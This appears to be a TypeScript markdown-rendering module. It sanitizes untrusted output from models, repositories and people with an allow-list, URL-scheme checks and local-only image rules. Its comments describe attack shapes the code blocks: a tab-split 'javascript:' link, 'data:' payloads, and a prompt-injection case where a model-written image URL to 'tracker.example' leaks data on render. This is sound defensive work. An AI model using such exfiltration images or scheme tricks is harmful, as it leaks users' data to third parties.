import { isAbsolute, resolve } from 'node:path'

import { Marked, type Tokens } from 'marked'
import { markedHighlight } from 'marked-highlight'

import { highlightCode } from './highlight.ts'
import { sanitizeHtml } from './sanitize.ts'

/**
 * Markdown rendering, on **marked**.
 *
 * The first version of this file was a renderer written here. It was replaced on the owner's instruction on
 * 2026-10-11 — find an existing library with few dependencies and high function rather than writing one — and the
 * instruction was right on the evidence:
 *
 * - `marked` 18.1.0 has **zero dependencies** and 520 KB on disk, against four runtime dependencies for the whole
 *   harness, and a few times that size for `markdown-it`, `micromark` or `remark` once their trees are counted;
 * - it is maintained, and it renders constructs mine did not: nested lists, tables with alignment, autolinks,
 *   reference links, strikethrough, task lists, and the rest of GitHub-flavoured markdown.
 *
 * What it does **not** do is make any of that safe, and that is why this file still exists. `marked` documents
 * that it "does not sanitize the output HTML", and a document here is untrusted text — from a model, a repository,
 * or a person. So the two guarantees the written renderer had are kept here, and **the unit tests that assert them
 * are unchanged**: they were the acceptance test for adopting a library rather than something to relax for one.
 *
 * 1. **The library's output is reduced to an allow-list of elements and attributes**, so a document cannot produce
 *    a tag of its own. Measured: escaping the *source* first was wrong — `marked` escapes the escaped text again
 *    inside a code block, so `1 < 2` in a fence rendered as `&amp;lt;`. The guarantee belongs on the output when
 *    the parser is someone else's code, and it is an allow-list rather than a deny-list because a deny-list is a
 *    list of the attacks its author thought of.
 * 2. **A link's scheme is checked** in the renderer's own hook. Measured: `marked` emits `href="javascript:…"`
 *    without complaint, so the check has to be here.
 */

/** Escape the five characters that can start a tag, an entity, or a quote break-out. */
export function escapeHtml(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

/**
 * Whether a link's target may be followed.
 *
 * Relative targets, fragments, and the three schemes a document legitimately links to are allowed; everything else
 * becomes text. A renderer that passes a `javascript:` URL through hands a document the ability to run code, and
 * "the browser decides" is not a defence — the browser follows what it is given.
 */
export function safeUrl(url: string): string | null {
  /**
   * Judged as a browser's URL parser reads it (WHATWG URL), which trims C0 controls and spaces at both ends and drops
   * tab and newline **wherever they are**. So the ends are trimmed of both those and white space, and a URL still
   * holding a tab, newline or carriage return is refused: `java<TAB>script:` had no scheme to the pattern below and
   * passed as a relative path, while the browser followed `javascript:` (live issue developer-two-6). A URL meant
   * literally never holds those characters raw. The Rust `safe_url` decides the same.
   */
  const trimmed = String(url ?? '').replace(/^[\u0000-\u0020\s]+|[\u0000-\u0020\s]+$/g, '')
  if (trimmed.length === 0 || /[\t\n\r]/.test(trimmed)) return null
  if (/^[a-z][a-z0-9+.-]*:/i.test(trimmed)) {
    return /^(?:https?|mailto):/i.test(trimmed) ? trimmed : null
  }
  return trimmed
}

/**
 * Where an embedded subresource should be fetched from.
 *
 * A document's relative reference — `![icon](heddle.svg)` — means *beside this document*, and a browser resolves it
 * against the **page URL** instead, which is the server root. Measured: that request answered `404`, so a document
 * with an image in it showed alt text and a broken marker. The reference is therefore resolved against the
 * document's own folder and handed to the route that serves a file's bytes.
 *
 * A remote URL is left exactly as written: it is the author's choice, it is not this server's to re-host, and
 * `safeUrl` has already refused the schemes that would run code. A `data:` image is not a file at all, so it is
 * refused here — the alternative is a document smuggling an arbitrary payload into the page.
 */
interface ResolvedSubresource {
  /** The file this reference names, as an absolute path. */
  readonly path: string
  /** The `#part` of the reference, without its `#`, or an empty string. */
  readonly fragment: string
}

/**
 * The file a relative subresource names, or `null` when the reference is not this server's to resolve.
 *
 * The return is two named pieces rather than one assembled string, and that is a correction: the first version
 * returned a `data-heddle-path=…` fragment for a link and then took it apart again with a **slice whose length was
 * the attribute name's** — so a raw HTML `<a href="README.md">` came out as
 * `href="data-heddle-path=%2FUsers…"`, a link to nowhere. Two pieces cannot be mis-split, and the caller builds the
 * markup it needs.
 */
function resolveSubresource(href: string, base: string | undefined): ResolvedSubresource | null {
  const trimmed = href.trim()
  if (trimmed.length === 0) return null
  /** A remote URL is the author's choice and is left exactly as written. */
  if (/^(?:https?:)?\/\//i.test(trimmed)) return null
  /** A `data:` image is a payload rather than a file, and a document that can embed one can smuggle one. */
  if (trimmed.startsWith('data:')) return null
  /** A fragment inside this document is not a file to look for beside it. */
  if (trimmed.startsWith('#')) return null
  if (base === undefined) return null
  const [target, fragment] = splitFragment(trimmed)
  return { path: isAbsolute(target) ? target : resolve(base, target), fragment }
}

/** The route that serves a file's bytes, which is what an `<img>` and a followed link both need. */
function rawUrl(resolved: ResolvedSubresource): string {
  return `/api/raw?path=${encodeURIComponent(resolved.path)}${resolved.fragment.length > 0 ? `#${resolved.fragment}` : ''}`
}

/** A URL split at its `#`, which a browser treats as a place inside the document rather than part of its name. */
function splitFragment(url: string): [string, string] {
  const at = url.indexOf('#')
  return at === -1 ? [url, ''] : [url.slice(0, at), url.slice(at + 1)]
}

/** The attribute a link carries the file it names in, so the page can open it instead of navigating away. */
export const LINK_DATA_ATTRIBUTE = 'data-heddle-path'

/**
 * The parser, configured once.
 *
 * `gfm` stays on because it is the dialect a document in a repository is written in. `breaks` stays **off**: one
 * newline inside a paragraph is a space in that dialect, and turning it on reflows every wrapped line of prose
 * into its own line.
 */
const marked = new Marked({ gfm: true, breaks: false })

/**
 * The folder a document's relative images resolve against, for the parse in progress.
 *
 * One module-level value rather than a closure per document, because `marked`'s renderer hooks cannot be handed
 * per-call state: the parse is synchronous and single-threaded, so this is set immediately before a parse and read
 * during it. The setter below is the only writer.
 */
let imageBase: string | undefined

/**
 * Whether an image may come from another host, for the parse in progress: a document's preview (`remoteImages`) keeps
 * the author's remote image as written; an answer does not. Set beside `imageBase`, by the same two entry points.
 */
let remoteImagesAllowed = false

/**
 * Where an image is fetched from, or `null` when it is not fetched at all (the image becomes its alt text).
 *
 * A document's preview resolves a relative image beside the document and leaves a remote one as written. An **answer**
 * shows only local files, as DSH's `localPathMediaUrl` does ("undefined for unsupported protocols and non-local
 * paths"): an absolute path goes to the route that serves a file's bytes, and a remote, protocol-relative or unresolvable
 * source is not fetched. Before this an answer's `![x](https://tracker.example/p.png?d=…)` was fetched by the browser the
 * moment the answer was drawn, with no click, so a model led by a hostile file could send out what it had read; and
 * `![x](/api/sessions)` made the page request an API of the answer's choosing (live issue developer-two-7, 2026-10-29).
 */
function imageSource(target: string): string | null {
  /**
   * Already the route that serves a file's bytes: the renderer above wrote it, and the sanitizer hands it back here as
   * a raw `<img>`. It is a local file either way, so it is kept rather than wrapped a second time.
   */
  if (target.startsWith('/api/raw?')) return target
  const resolved = resolveSubresource(target, imageBase)
  if (resolved !== null) return rawUrl(resolved)
  if (remoteImagesAllowed) return target
  const [path, fragment] = splitFragment(target)
  if (path.startsWith('/') && !path.startsWith('//')) return rawUrl({ path, fragment })
  return null
}

/**
 * A leading `_` is escaped, so a name is a name.
 *
 * Measured, and it is a defect this repository hits everywhere: `# _tools_` rendered as `<em>tools</em>`, so the
 * folder names this project is made of — `_tools_`, `_verifiers_`, `_context_`, `_projects_` — **lost their
 * underscores** in every document that named one. `snake_case` inside a word survives, because that case flanks a
 * word on both sides; a lone `_name_` does not, and CommonMark's rule about intraword underscores says nothing
 * about a name standing alone.
 *
 * The escape is markdown's own: a backslash makes the character literal, which is what a document that wanted a
 * literal underscore would have written. Asterisks still make emphasis, so `*italics*` and `**bold**` are
 * unaffected — only the leading `_` of an underscore-run is touched, and `_` is still allowed to mean `_` in the
 * middle of a word, which is where it was already safe.
 */
function escapeLeadingUnderscores(markdown: string): string {
  /**
   * Code is left alone, because a backslash **inside code is visible** — measured: a fence containing `_a_b_`
   * rendered as `\_a_b_`, and an escape that changes the text of code is worse than the emphasis it prevents. Code
   * spans keep their underscores without help, since emphasis does not run inside them.
   */
  const lines = markdown.split('\n')
  const out: string[] = []
  let fence: string | null = null
  for (const line of lines) {
    const marker = /^\s*(```|~~~)/.exec(line)
    if (marker !== null) {
      const character = marker[1] ?? '```'
      if (fence === null) fence = character
      else if (fence === character) fence = null
      out.push(line)
      continue
    }
    if (fence !== null) {
      out.push(line)
      continue
    }
    /** A code span is `...`; the escape is applied to the parts that are not inside one. */
    out.push(
      line
        .split(/(`[^`]*`)/)
        .map((piece) => (piece.startsWith('`') ? piece : piece.replace(/(^|\s)_(?=[^\s_])/g, '$1\\_')))
        .join(''),
    )
  }
  return out.join('\n')
}

/**
 * Colour the code, through the marked plugin that pairs the two libraries.
 *
 * A fence keeps its language while the highlighter colours it: `class="language-ts"` on the `<code>`, and the
 * highlighter's own `hljs-` spans inside. The allow-list accepts both because it permits `span`, `class` and `pre`,
 * and nothing else the highlighter could emit.
 */
marked.use(
  markedHighlight({
    langPrefix: 'language-',
    highlight: (code: string, language: string) => highlightCode(code, language),
  }),
)

/**
 * The two renderer hooks that exist for safety, rather than for formatting.
 *
 * Both passed the label's **raw text** through at first, and that was a measured bug: a code span inside link text
 * rendered its backticks literally, so `[`x`](a.md)` — the shape this repository's index tables are full of — came
 * out as an anchor containing a backtick instead of a `code` element. `tokens` is what the parser already decided
 * the label means, and `this.parser` writes it exactly as it would be written outside a link, so emphasis and code
 * spans behave the same in both places. A label whose scheme is refused keeps its text, with the reason beside it,
 * so a reader who saw a link in the source sees what became of it.
 */
marked.use({
  renderer: {
    link(this: { parser: { parseInline(tokens: unknown[]): string } }, { href, title, tokens }: Tokens.Link): string {
      const label = this.parser.parseInline(tokens as unknown[])
      const target = safeUrl(href)
      if (target === null) return `${label} (link refused)`
      const heading = title === null || title === undefined ? '' : ` title="${escapeHtml(title)}"`
      const resolved = resolveSubresource(target, imageBase)
      /**
       * A link to a file in the workspace keeps its `href` as the **raw** address, so the status bar and a
       * middle-click both still point somewhere real, and carries the absolute path in an attribute so a plain click
       * opens it in this panel instead of navigating the page to a path the server does not serve. Measured before
       * this: `[x](DEPLOY.md)` asked for `/DEPLOY.md`, which answered `404`, and the reader lost the page they were
       * reading. A remote link is untouched and opens in a new tab.
       */
      if (resolved !== null) {
        return `<a href="${escapeHtml(rawUrl(resolved))}" ${LINK_DATA_ATTRIBUTE}="${escapeHtml(resolved.path)}"${heading}>${label}</a>`
      }
      const external = /^(?:https?:)?\/\//i.test(target)
      return `<a href="${escapeHtml(target)}"${external ? ' target="_blank"' : ''} rel="noreferrer noopener"${heading}>${label}</a>`
    },
    /** An image with a refused source becomes its alt text, so nothing is fetched and nothing is lost. */
    image(this: { parser: { parseInline(tokens: unknown[]): string } }, { href, title, text, tokens }: Tokens.Image): string {
      const label = tokens === undefined ? escapeHtml(text) : this.parser.parseInline(tokens as unknown[])
      const target = safeUrl(href)
      if (target === null) return label
      /** The base is set per parse, so one document's relative images do not resolve against another's. */
      const source = imageSource(target)
      if (source === null) return label
      const heading = title === null || title === undefined ? '' : ` title="${escapeHtml(title)}"`
      return `<img src="${escapeHtml(source)}" alt="${escapeHtml(text)}"${heading}>`
    },
  },
})

/**
 * Render inline spans only — a title, a table cell, a label.
 *
 * The library's own inline parser, which is part of the point of using it: one implementation of emphasis and
 * code spans rather than two that can disagree.
 */
export function renderInline(text: string): string {
  /** An inline span is never a document's preview: its images follow an answer's rule, whatever parsed last. */
  imageBase = undefined
  remoteImagesAllowed = false
  return sanitizeHtml(marked.parseInline(escapeLeadingUnderscores(String(text ?? ''))) as string, {
    url: (value, at) => {
      const safe = safeUrl(value)
      return safe !== null && at.tag === 'img' ? imageSource(safe) : safe
    },
  })
}

/**
 * Render a document to HTML.
 *
 * A leading YAML block is lifted out and shown as metadata rather than parsed: every document in this repository
 * opens with frontmatter, and as markdown it renders as a horizontal rule and a heading made of the first key.
 */
export function renderMarkdown(source: string, options: { readonly base?: string; readonly remoteImages?: boolean } = {}): string {
  imageBase = options.base
  /** Only a document's preview asks for remote images; an answer, which has no `base`, never does. */
  remoteImagesAllowed = options.remoteImages === true
  const text = String(source ?? '').replace(/\r\n?/g, '\n')
  const front = /^---\n([\s\S]*?)\n---\n?/.exec(text)
  const body = front === null ? text : text.slice(front[0].length)
  const frontHtml =
    front === null
      ? ''
      : `<section class="frontmatter"><h2>frontmatter</h2><pre><code>${escapeHtml((front[1] ?? '').trim())}</code></pre></section>\n`
  return sanitizeHtml(frontHtml + (marked.parse(escapeLeadingUnderscores(body)) as string), {
    /**
     * One rule for a subresource, **wherever the tag came from**.
     *
     * The renderer above handles what `marked` produces. Raw HTML goes around that renderer, so an `<img>` or an `<a>`
     * written by hand would otherwise keep a relative address the browser resolves against the page URL — which is the
     * server root, and measured as a `404`. The callback is handed the tag and the attribute, so both are resolved by
     * the same function the renderer uses: an image to the route that serves bytes, and a link to the attribute the
     * panel follows.
     */
    url: (value, at) => {
      const safe = safeUrl(value)
      if (safe === null) return null
      /** A hand-written `<img>` in an answer follows the same rule as a markdown image there: local files only. */
      if (at.tag === 'img' && !remoteImagesAllowed) return imageSource(safe)
      /** A reference with a scheme, or one already absolute, is not a file beside the document. */
      const relative = !/^[a-z][a-z0-9+.-]*:/i.test(safe) && !safe.startsWith('/') && !safe.startsWith('#')
      if (!relative) return safe
      const resolved = resolveSubresource(safe, imageBase)
      if (resolved === null) return safe
      /**
       * A raw HTML link arrives here rather than at the renderer, because `marked` passes an HTML block straight
       * through — so a hand-written `<a href="README.md">` gets the served address from this callback. The path for
       * the page to follow rides in that address (see the page's click handler), since an attribute cannot be added
       * from inside a callback that answers for one attribute's value.
       */
      return rawUrl(resolved)
    },
  })
}
